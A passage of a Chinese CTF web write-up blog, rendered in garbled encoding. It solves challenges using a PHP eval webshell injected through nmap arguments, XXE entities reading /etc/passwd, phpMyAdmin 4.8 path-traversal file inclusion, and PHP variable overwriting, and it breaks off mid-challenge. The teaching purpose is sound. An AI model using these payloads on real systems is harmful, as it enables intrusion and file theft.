<p>è¿›å…¥MD5ç›®å½•ä¸‹çš„1.php<br><img src="/images/S3IOWE9SGW1BLCJK5.png" srcset="/img/loading.gif" lazyload><br>å¼€å§‹RCE</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">POST:<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå°é—®é¢˜</p>
<p>é¦–å…ˆæ˜¯åé¢æ²¡æœ‰åŠ å¼•å·</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php</span><br></code></pre></td></tr></table></figure>

<p>å…ˆç»è¿‡escapeshellarg()å‡½æ•°å¤„ç†ï¼Œè¯¥å‡½æ•°ä¼šå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?host=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p>å†ç»è¿‡escapeshellcmd()å‡½æ•°å¤„ç†ï¼Œescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼Œè½¬ä¹‰å‘½ä»¤ä¸­çš„æ‰€æœ‰shellå…ƒå­—ç¬¦æ¥å®Œæˆå·¥ä½œã€‚è¿™äº›å…ƒå­—ç¬¦åŒ…æ‹¬ï¼š<code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\ã€‚</code></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?h</span>ost=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php\<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p>è¿”å›ç»“æœæ˜¯ä¸Šé¢é‚£æ ·æ–‡ä»¶ååé¢ä¼šå¤šä¸€ä¸ªå¼•å·1.phpâ€™</p>
<p>ç¬¬äºŒä¸ªæ˜¯åŠ å¼•å·ä½†å¼•å·å‰æ²¡æœ‰ç©ºæ ¼</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php&#x27;</span><br></code></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœå¦‚ä¸‹</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>æ–‡ä»¶ååé¢å°±ä¼šå¤šå‡º<code>\\</code> <code>1.php\\</code><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>å…ˆå°è¯•sqlæ³¨å…¥ï¼Œè¡Œä¸é€š<br>çœ‹çœ‹æºç <br><img src="/images/VSCRU5OH75NYS3N.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶<br>è¿˜æœ‰<br><code>contentType: &quot;application/xml;charset=utf-8&quot;,</code><br>è¿›å…¥doLogin.php<br><img src="/images/NY0S07MJ2GOIRTM3AJF.png" srcset="/img/loading.gif" lazyload><br>å‘ç°éƒ½æŒ‡å‘xml<br>é‚£ä¹ˆxmlæœ‰ä¸ªxxeæ¼æ´ï¼ŒæŠ“åŒ…çœ‹èƒ½å¦åˆ©ç”¨ä¸€ä¸‹ï¼Œæ„å»ºä¸€ä¸ªæ¶æ„çš„å¤–éƒ¨å®ä½“<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/CK8BJG03EQERY8O69T0.png" srcset="/img/loading.gif" lazyload><br>å¯è¡Œï¼Œçœ‹èƒ½ä¸èƒ½ç›´æ¥è¯»å–flag<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/MLC6SAFLMOJVT39WPR.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¼ é€é—¨&#x3D;&#x3D;&#x3D;&gt;<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´</a></p>
<h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p><img src="/images/JMFRP9VYT5A0VKQDORT.png" srcset="/img/loading.gif" lazyload><br>æ•´äº†ä¸ªè¿™ä¹ˆä¸ªç•Œé¢ï¼Œæœ‰ç‚¹è¿·ç³Šï¼ŒæŠ“åŒ…æºç éƒ½æ²¡è·å¾—æœ‰æ•ˆçš„ä¿¡æ¯<br>ç”¨dirsearchæ‰«æ‰«ï¼Œæ‰«åˆ°äº†robots.txtï¼Œé‡Œé¢æç¤ºäº†ä¸ªphpinfo.phpï¼Œè¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„ä¿¡æ¯<br>å†å¾€åç»§ç»­æ‰«åˆ°äº†phpmyadminï¼Œè¿›å…¥æŸ¥çœ‹ï¼Œæ•°æ®åº“é‡Œä¸€å¤§å †å†…å®¹æ ¹æœ¬æ‡’å¾—çœ‹<br><img src="/images/XXQ3LARFHLVNSZQEEQW.png" srcset="/img/loading.gif" lazyload><br>æŸ¥é˜…åˆ°4.8.0 &lt;&#x3D; phpMyAdmin &lt; 4.8.2ç‰ˆæœ¬çš„phpmyadminéƒ½æ˜¯æœ‰æ–‡ä»¶åŒ…å«æ¼æ´<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111039461">æ¼æ´å¤ç°</a><br>ä¾‹å¦‚ä¼ å…¥</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">target</span><span class="hljs-operator">=</span>db_datadict.php<span class="hljs-variable">%253</span>f<br></code></pre></td></tr></table></figure>
<p>ç”±äºæœåŠ¡å™¨ä¼šè‡ªåŠ¨è§£ç ä¸€æ¬¡ï¼Œæ‰€ä»¥åœ¨checkPageValidity()ä¸­ï¼Œ$pageçš„å€¼ä¸€å¼€å§‹ä¼šæ˜¯db_datadict.php%3f,åˆä¸€æ¬¡urlè§£ç åå˜æˆäº†db_datadict.php?,è¿™ä¾¿ç¬¦åˆäº†?å‰å†…å®¹åœ¨ç™½åå•çš„è¦æ±‚ï¼Œå‡½æ•°è¿”å›trueä½†åœ¨index.phpä¸­$_REQUEST[â€˜targetâ€™]ä»ç„¶æ˜¯db_datadict.php%3f,è€Œä¸”ä¼šè¢«includeï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šï¼Œå°±å¯é€ æˆä»»æ„æ–‡ä»¶åŒ…å«</p>
<p>æ¼æ´åŸç†æ˜¯ï¼š<br>åˆ©ç”¨&#x2F;ä½¿db_datadict.php?æˆä¸ºä¸€ä¸ªä¸å­˜åœ¨ç›®å½•ï¼Œåˆ©ç”¨includeå‡½æ•°çš„ç›®å½•ä¸æ–­è·³è½¬å°è¯•å¾—åˆ°flagç›®å½•ã€‚</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">25</span></span>çš„urlç¼–ç ä¸º%<br><span class="hljs-tag">%<span class="hljs-selector-tag">3f</span></span>çš„urlç¼–ç ä¸º?<br><span class="hljs-tag">%<span class="hljs-selector-tag">253f</span></span>--&gt;?<br></code></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>

<p><img src="/images/G1EYMWNMMY6OS2BF0.png" srcset="/img/loading.gif" lazyload><br>å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œè·å–åˆ°äº†passwdæ–‡ä»¶çš„å†…å®¹ï¼Œå°è¯•æŸ¥æ‰¾flag<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<br></code></pre></td></tr></table></figure>

<p><img src="/images/XZ69C0YPOUN95B37GM.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="BJDCTF2020 Mark loves cat"></a>BJDCTF2020 Mark loves cat</h2><p>æŸ¥çœ‹æºç ä»¥åŠæŠ“åŒ…ï¼Œæ²¡æœ‰æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯<br>å°è¯•dirsearchæ‰«æï¼Œå‘ç°å­˜åœ¨.gitæ³„éœ²<br>é‚£ä¹ˆç›´æ¥ç”¨git_hackæ‰«å‡ºæ–‡ä»¶<br>åœ¨index.phpæ–‡ä»¶ä¸­æ‰¾å‡ºphpæºç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><br><span class="hljs-regexp">/*include &#x27;flag.php&#x27;;*/</span><br>highlight_file(__FILE__);<br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br>foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>exitå’Œdieä¸€æ ·ï¼Œéƒ½æ˜¯è¾“å‡ºä¸€æ¡ä¿¡æ¯åé€€å‡ºå½“å‰è„šæœ¬<br>ä¸Šé¢çš„ä»£ç ä¸­æœ€é‡è¦çš„ä¸¤å—ä»£ç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>åˆ©ç”¨ä¸€ä¸‹,å…ˆè§£é‡Šä¸€ä¸‹å¯å˜å˜é‡ï¼š<br>å¦‚æœä¸€ä¸ªå˜é‡ä¿å­˜çš„å€¼åˆšå¥½æ˜¯å¦å¤–ä¸€ä¸ªå˜é‡çš„åå­—ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥é€šè¿‡è®¿é—®ä¸€ä¸ªå˜é‡å¾—åˆ°å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼ï¼šåœ¨å˜é‡ä¹‹å‰å†å¤šåŠ ä¸€ä¸ª$ç¬¦å·<br>ä¾‹ï¼š</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=&#x27;b&#x27;;</span><br><span class="hljs-meta"><span class="hljs-keyword">$b</span>=&#x27;bbbb&#x27;;</span><br>echo <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a;<br><span class="hljs-comment">//è¾“å‡ºbbbb </span><br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a-&gt;<span class="hljs-symbol">$</span>b<br></code></pre></td></tr></table></figure>
<p>ç®€å•ç†è§£ä¸º$$aç›¸å½“äº$($a)<br>å†å¯¹ä¸Šé¢çš„ä»£ç è¿›è¡Œè§£è¯»</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$</span><span class="hljs-variable">$x</span> = <span class="hljs-variable">$</span><span class="hljs-variable">$y</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>æ¯”å¦‚GETè¾“å…¥a&#x3D;flag<br>é‚£ä¹ˆ$x&#x3D;a,$y&#x3D;flag<br> $$x &#x3D; $$yæ‰€ä»¥$a&#x3D;$flag,é…åˆexitè¿™æ ·å°±å¯ä»¥è¾“å…¥$flagçš„å€¼äº†<br> æ„é€ payload<br> <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?handsome=<span class="hljs-built_in">flag</span>&amp;x=<span class="hljs-built_in">flag</span>&amp;<span class="hljs-built_in">flag</span>=x<br></code></pre></td></tr></table></figure><br>handsome&#x3D;flagä¸ç”¨è¯´ å°±æ˜¯è®©$handsome&#x3D;$flag<br>åé¢çš„ç›®çš„å°±æ˜¯è®©æˆ‘ä»¬ä¼ å…¥çš„å˜é‡æ˜¯ flag å€¼ä¸æ˜¯flag è¿›è€Œèƒ½å¤Ÿexit handsome<br>è¿™é‡Œçš„å€¼è¡¨é¢æ˜¯ x ä½†å‰é¢æˆ‘ä»¬è¿›è¡Œäº†å˜é‡è¦†ç›–ä½¿å¾— x&#x3D;flag æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬è¾“å‡ºxçš„å€¼å°±æ˜¯flagçš„å€¼<br><img src="/images/JNSYNMWR0M0GM7R.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>çœ‹åˆ°è¿™ç§æ²¡æœ‰å¾ˆå¤šæè¿°çš„é¢˜ç›´æ¥æå‡ºdirsearch<br>æ‰«å‡ºrobots.txt<br>é‡Œé¢æç¤ºäº†fAke_f1agggg.php<br>è¿›å…¥æŸ¥çœ‹ï¼Œä¸å‡ºæ„æ–™<br>å“ªå“ªéƒ½çœ‹ä¸€çœ‹<br>æ‰¾åˆ°ä¸€ä¸ª<br><img src="/images/UK82BH2SOKD0KWXEE9F6U.png" srcset="/img/loading.gif" lazyload><br>å¾ˆéš¾ç»·<br><img src="/images/0F4A1WUAHEN3Y59N.png" srcset="/img/loading.gif" lazyload><br>æ¢ç´¢åˆ°ä¸€ä¸ªæ–°åŠŸèƒ½ğŸ™‚<br><img src="/images/TLFZIYE71LUDA05O.png" srcset="/img/loading.gif" lazyload><br>è½¬åŒ–ä¹‹å</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>å¥½å—å¤šäº†ï¼Œç°åœ¨ä¹Ÿå®¹æ˜“äº†<br>ç›´æ¥payload</p>
